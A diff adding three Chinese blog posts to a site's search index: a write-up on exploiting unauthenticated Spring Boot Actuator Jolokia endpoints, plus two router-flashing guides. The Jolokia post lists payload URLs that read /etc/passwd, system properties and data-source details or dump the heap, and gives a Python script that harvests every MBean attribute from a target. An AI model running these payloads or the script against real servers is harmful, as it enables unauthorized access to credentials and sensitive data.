@@ -2840,4 +2840,124 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
         <tag>折腾</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Jolokia利用记录</title>
+    <url>/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近发现了一个<code>Springboot Actuator Jolokia 未授权访问漏洞</code>，了解了一下感觉挺好玩的，记录一下学习过程。<br>Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。</p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h4><p>Jolokia是一款开源产品，用于为JMX（Java Management Extensions）技术提供HTTP API接口。其中，该产品提供了一个API，用于调用在服务器上注册的MBean并读/写其属性。JMX技术用于管理和监视设备、应用程序和网络驱动的服务。</p>
+<p>通常我们发现它的时候可能是类似下面的路径：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator&#x2F;jolokia&#x2F;list</span><br></pre></td></tr></table></figure>
+<p>响应结果是json格式：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-05-33.png"></p>
+<p>整个json文本的内容非常多，通过vscode美化一下：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-14-36.png"></p>
+<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>jolokia的调用支持GET请求和POST请求格式。</p>
+<p><em>GET请求：</em></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base-url</span>&gt;</span>/<span class="tag">&lt;<span class="name">type</span>&gt;</span>/<span class="tag">&lt;<span class="name">arg1</span>&gt;</span>/<span class="tag">&lt;<span class="name">arg2</span>&gt;</span>/..../</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/jolokia/read/java.lang:type=Memory/HeapMemoryUsage</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-30-12.png"></p>
+<p><em>POST请求（json）：</em></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot; : &quot;read&quot;,</span><br><span class="line">  &quot;mbean&quot; : &quot;java.lang:type=Memory&quot;,</span><br><span class="line">  &quot;attribute&quot; : &quot;HeapMemoryUsage&quot;,</span><br><span class="line">  &quot;path&quot; : &quot;used&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-37-24.png"></p>
+<h4 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h4><p>那么如何调用MBean进行利用呢？相信看完下面的例子你就会懂了。</p>
+<p>首先要理解我们可以做什么操作，Jolokia 可执行的操作（operations）有：<code>read</code>、<code>write</code>、<code>exec</code>、<code>search</code>、<code>list</code>。</p>
+<p>比如我要读取<code>java.util.logging</code>下<code>type=Logging</code>的<code>attr</code>里面的<code>LoggerNames</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/actuator/jolokia/<span class="built_in">read</span>/java.util.logging:<span class="built_in">type</span>=Logging/LoggerNames</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-40-36.png"></p>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-42-35.png"></p>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-27-11-33-45.png"></p>
+<p>调用某个MBean：<br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-25-13-37-18.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;actuator&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;DiagnosticCommand&#x2F;vmUnlockCommercialFeatures&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-04-25-13-33-06.png"></p>
+<p>那么，哪些可以<code>read</code>，哪些可以<code>exec</code>呢？</p>
+<p>我们可以观察<code>list</code>列出的MBeans字典，<code>attr</code>里面的都可以<code>read</code>、<code>write</code>，<code>op</code>里面的方法都可以<code>exec</code><br><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-47-37.png"></p>
+<p>如果要传递参数，则在后面加斜杠<code>/</code>+<code>参数值</code>，如果参数有<code>/</code>或者<code>!</code>等则需要按下表转义：</p>
+<table>
+<thead>
+<tr>
+<th>Escaped</th>
+<th>Unescaped</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>!/</code></td>
+<td><code>/</code></td>
+</tr>
+<tr>
+<td><code>!!</code></td>
+<td><code>!</code></td>
+</tr>
+<tr>
+<td><code>!&quot;</code></td>
+<td><code>&quot;</code></td>
+</tr>
+<tr>
+<td><code>!</code><em>(anything else)</em></td>
+<td><em>(anything else)</em></td>
+</tr>
+</tbody></table>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;HotSpotDiagnostic&#x2F;dumpHeap&#x2F;!&#x2F;tmp!&#x2F;a.hprof&#x2F;0 </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="一些可能有用的payload"><a href="#一些可能有用的payload" class="headerlink" title="一些可能有用的payload"></a>一些可能有用的payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;jolokia&#x2F;read&#x2F;java.lang:type&#x3D;Runtime&#x2F;SystemProperties</span><br><span class="line">&#x2F;jolokia&#x2F;read&#x2F;com.alibaba.druid:type&#x3D;DruidDataSourceStat&#x2F;DataSourceList</span><br><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;DiagnosticCommand&#x2F;compilerDirectivesAdd&#x2F;!&#x2F;etc!&#x2F;passwd</span><br><span class="line">&#x2F;jolokia&#x2F;exec&#x2F;com.sun.management:type&#x3D;HotSpotDiagnostic&#x2F;dumpHeap&#x2F;!&#x2F;tmp!&#x2F;a.hprof&#x2F;0 </span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2023/04/25/Jolokia%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2023-05-03-21-57-34.png"></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>写了个简易脚本去读取所有的attr及执行所有的dump操作，基本上无害，看看能不能发现一些敏感数据：</p>
+<figure class="highlight plain"><figcaption><span>requests</span></figcaption><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">jolokiaurl &#x3D; &#39;http:&#x2F;&#x2F;xxx&#x2F;actuator&#x2F;jolokia&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">        &#39;http&#39;: &#39;http:&#x2F;&#x2F;192.168.1.1:8080&#39;,</span><br><span class="line">        &#39;https&#39;: &#39;http:&#x2F;&#x2F;192.168.1.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &#39;user-agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;50.0.2661.102 UBrowser&#x2F;6.1.3397.16 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getList(url):</span><br><span class="line">    turl &#x3D; url + &#39;list&#39;</span><br><span class="line">    r &#x3D; requests.get(turl)</span><br><span class="line">    # print(r.json())</span><br><span class="line">    return r.json()[&#39;value&#39;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parserList(jolokia_list, jolokiaurl):</span><br><span class="line">    for j_class in jolokia_list:</span><br><span class="line">        for j_type in jolokia_list[j_class]:</span><br><span class="line">            if &#39;op&#39; in jolokia_list[j_class][j_type]:</span><br><span class="line">                for j_op in jolokia_list[j_class][j_type][&#39;op&#39;]:</span><br><span class="line">                    if j_op &#x3D;&#x3D; &#39;dump&#39;:</span><br><span class="line">                        url &#x3D; f&quot;&#123;jolokiaurl&#125;exec&#x2F;&#123;j_class&#125;:&#123;j_type&#125;&#x2F;&#123;j_op&#125;&quot;</span><br><span class="line">                        r &#x3D; requests.get(url, proxies&#x3D;proxies, headers&#x3D;headers)</span><br><span class="line">                        print(r.text)</span><br><span class="line">            if &#39;attr&#39; in jolokia_list[j_class][j_type]:</span><br><span class="line">                for j_attr in jolokia_list[j_class][j_type][&#39;attr&#39;]:</span><br><span class="line">                    url &#x3D; f&quot;&#123;jolokiaurl&#125;read&#x2F;&#123;j_class&#125;:&#123;j_type&#125;&#x2F;&#123;j_attr&#125;&quot;</span><br><span class="line">                    print(url)</span><br><span class="line">                    r &#x3D; requests.get(url, proxies&#x3D;proxies, headers&#x3D;headers)</span><br><span class="line">                    print(r.text)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global jolokiaurl</span><br><span class="line">    if &#39;&#x2F;&#39; !&#x3D; jolokiaurl[-1:]:</span><br><span class="line">        jolokiaurl +&#x3D; &#39;&#x2F;&#39;</span><br><span class="line">    # print(jolokiaurl)</span><br><span class="line">    jolokia_list &#x3D; getList(jolokiaurl)</span><br><span class="line">    parserList(jolokia_list, jolokiaurl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上仅是个人不太深入的经验总结，欢迎批评指正。授人以鱼不如授人以渔，大家可根据对应的<code>list</code>结果查找可利用的MBean。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://jolokia.org/reference/html/protocol.html#jolokia-operations">https://jolokia.org/reference/html/protocol.html#jolokia-operations</a><br><a href="https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/">https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/</a><br><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a><br><a href="https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>兆能ZN-M2救砖记</title>
+    <url>/2023/05/03/%E5%85%86%E8%83%BDZN-M2%E6%95%91%E7%A0%96%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>大概是自己做固件的时候忘了配置屏蔽WiFi，在更新ZN-M2的时候刷入了一个带WiFi的openwrt固件，好家伙，直接开机进不了后台，勉强能SSH登录但几乎无法操作，查看内存剩余4MB，想scp复制新的固件进去都会中断。然后进入不死uboot想重新刷，但是刷入任何固件均失败了，包括AX18和ZN-M2的，最终无奈进行TTL大法刷回原版固件。</p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先拆机、TTL接线，这些基操在之前的文章都说过了，可以参考：<a href="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/">小米CR8806免拆TTL刷机</a></p>
+<p>TTL接线，老规矩：<br>RXD -&gt; TXD<br>GND -&gt; GND<br>TXD -&gt; RXD</p>
+<p>插电后TTL开始滚屏，瞬间狂按esc进入命令行。</p>
+<p>一开始刷入mtd17没有恢复成功，然后刷入mtd16恢复了。</p>
+<p>可以用<code>smeminfo</code>看下分区表，mtd16是<code>rootfs</code>分区。</p>
+<p>刷入和普通TTL刷机一样，直接把<code>mtd16</code>文件通过tftp传入路由器内存，然后写入闪存：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv ipaddr 192.168.1.1</span><br><span class="line">setenv serverip 192.168.1.10  <span class="comment"># tftp服务器地址</span></span><br><span class="line">tftpboot mtd16</span><br><span class="line">flash rootfs</span><br><span class="line">saveenv</span><br></pre></td></tr></table></figure>
+
+<p>完了重启之后就能进入原版固件后台了。</p>
+<p>最后，奉上一份<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/ZN-M2/ZN-M2-MTD-BACKUP.7z">分区备份文件</a>。</p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>沛喆PZ-L8 TTL刷集客</title>
+    <url>/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>移动宽带送的WIFI6 AX3000路由器，不用白不用，刷个集客AP固件跟小米CR8806凑成一组。</p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>刷前提示：刷机有风险，建议备份好分区。</p>
+<p>刷入步骤其实跟CR8806极其相似，所以就把关键点说一下，其它的可以参考：<a href="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/">小米CR8806免拆TTL刷机</a></p>
+<p>首先是拆开后盖，TTL接线，老规矩：<br>RXD -&gt; TXD<br>GND -&gt; GND<br>TXD -&gt; RXD</p>
+<p><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-53-10.png"></p>
+<p>插电后TTL开始滚屏，瞬间狂按esc，手速要快，基本要开机前2秒内完成，成功后会出现<code>IPQ5018#</code>字样：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-10-22.png"></p>
+<p>下面是分区表记录一下：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-14-05.png"></p>
+<p>网线连接路由器WAN口和电脑网口，把集客固件<code>ubi-JIKEAP_N3000.img </code>放置在TFTP服务器上，可以自行去官网下最新的，测试版本库有。</p>
+<p>跟着恩山的教程刷入命令失败了，重启两次会变回原系统，后面照着小米CR8806的命令来刷成功：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv ipaddr 192.168.1.1</span><br><span class="line">setenv serverip 192.168.1.10  <span class="comment"># tftp服务器地址</span></span><br><span class="line">tftpboot ubi-JIKEAP_N3000.img </span><br><span class="line">flash rootfs_1</span><br><span class="line">setenv flag_try_sys2_failed 0 </span><br><span class="line">setenv flag_boot_rootfs 1</span><br><span class="line">setenv flag_last_success 1</span><br><span class="line">saveenv</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-17-22.png"></p>
+<p>完事拔电重启即可进入集客后台：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-46-47.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.right.com.cn/forum/thread-8264479-1-1.html">https://www.right.com.cn/forum/thread-8264479-1-1.html</a></p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
 </search>
